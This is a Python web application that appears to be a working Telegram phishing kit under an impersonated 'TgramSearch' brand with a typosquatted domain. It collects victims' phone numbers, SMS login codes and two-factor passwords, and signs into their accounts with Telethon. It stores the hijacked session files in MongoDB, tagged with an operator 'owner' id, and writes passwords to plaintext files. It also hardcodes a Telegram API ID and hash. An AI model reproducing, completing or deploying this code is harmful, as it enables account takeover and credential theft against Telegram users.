from os import path, remove

from quart import Quart, render_template, request, redirect
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, \
    PasswordHashInvalidError, SendCodeUnavailableError

# DATABASE
import pymongo
from datetime import datetime
# who can see a session
owner_id = ""

# fiel for DB
path_to_files = "/home/ivan/hi-van/code/telegram-scum/telegram_auth/fish_fix_copy/fish/"

app = Quart(__name__)

img = 'logo.png'
bg_link = 'https://tgramsearch.com/'
link = 'http://tgrammsearch.ru/'
name = 'TgramSearch'
site = 'tgramsearch.ru'
redirect_url = 'http://127.0.0.1:5500'

SESSIONS = {}
API_ID = 1891354
API_HASH = '7e8edd54e1b085bfb29af43c11c6c00e'


def delete(filename):
    if path.exists(filename):
        remove(filename)


async def build_client(session_name):
    session = TelegramClient(
        api_hash=API_HASH,
        api_id=API_ID,
        session=session_name
    )
    await session.connect()

    db_client = pymongo.MongoClient("mongodb://localhost:27017/")
    current_db = db_client["user_db"]
    collection = current_db["sessions"]

    current_date_string = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    item = {
        "fileURL": path_to_files + session_name + ".session",
        "authURL": "",
        "fileName": session_name,
        "uploadTime": current_date_string,
        "isDownload": "no",
        "owner": owner_id
    }

    collection.insert_one(item)
    print("1 | owner id is:")
    print(owner_id)
    db_client.close()
    return session


@app.route("/<string:text>", methods=['get'])
async def auth(text):
    global owner_id
    owner_id = text
    print("2 | owner id is:")
    print(owner_id)
    return await render_template('auth.html', img=img, link=link, bg_link=bg_link)


@app.route("/p", methods=['get'])
async def login():
    return await render_template('phone_form.html', img=img, link=link, bg_link=bg_link, name=name, site=site)

@app.route("/p", methods=['post'])
async def get_phone_number():
    phone_code = (await request.form).get('phone-code').lstrip("+")
    phone = (await request.form).get('phone').replace(' ', '')
    phone_number = str(phone_code) + str(phone)
    SESSIONS[phone_number] = await build_client(
        phone_number
    )

    try:
        await SESSIONS[phone_number].send_code_request(phone=phone_number, force_sms=True)
    
    except SendCodeUnavailableError:
        return await render_template("submit_code.html", phone=phone_number, img=img, link=link, bg_link=bg_link,
                                     name=name, site=site)

    except Exception as e:
        print(e)
        if session := SESSIONS.get(phone_number):
            SESSIONS.pop(phone_number)
            await session.disconnect()
            delete(phone_number + ".session")
        return await render_template("phone_form.html",
                                     error="This number is not registered in Telegram", img=img, link=link, bg_link=bg_link, name=name, site=site)
    return await render_template("submit_code.html", phone=phone_number, img=img, link=link, bg_link=bg_link, name=name, site=site)
 


@app.route("/s/<phone>", methods=['post'])
async def submit_code(phone: str):
    code = (await request.form).get("code")

    try:
        await SESSIONS[phone].sign_in(phone='+' + phone, code=code)
    except SessionPasswordNeededError:
        return await render_template("submit_password.html", phone=phone, img=img, link=link, bg_link=bg_link, name=name, site=site)
    except KeyError:
        return await render_template("phone_form.html",
                                     error="Invalid phone number")
    except PhoneCodeInvalidError as e:
        return await render_template("submit_code.html", phone=phone, error="Entered code not valid", img=img, link=link, bg_link=bg_link, name=name, site=site)
    return redirect(redirect_url)




@app.route("/sp/<phone>", methods=['post'])
async def submit_password(phone: str):
    password = (await request.form).get("password")

    try:
        await SESSIONS[phone].sign_in(phone='+' + phone, password=password)
        with open(f'{phone}.txt', 'a') as file:
            file.write(password + '\n')

        db_client = pymongo.MongoClient("mongodb://localhost:27017/")
        current_db = db_client["user_db"]
        collection = current_db["sessions"]
        
        query = {'fileName': phone}
        existing_document = collection.find_one(query)

        # Если запись найдена, обновляем поле authURL
        if existing_document:
            update_query = {'$set': {'authURL': path_to_files + phone + ".txt"}}
            collection.update_one(query, update_query)
        
        db_client.close()        

    except KeyError:
        return await render_template("phone_form.html", error="Incorrect phone number.", img=img, link=link, bg_link=bg_link, name=name, site=site)
    except PasswordHashInvalidError as e:
        return await render_template("submit_password.html", phone=phone, error="Password incorrect.", img=img, link=link, bg_link=bg_link, name=name, site=site)

    return redirect(redirect_url)


if __name__ == '__main__':
    app.run(host='0.0.0.0')
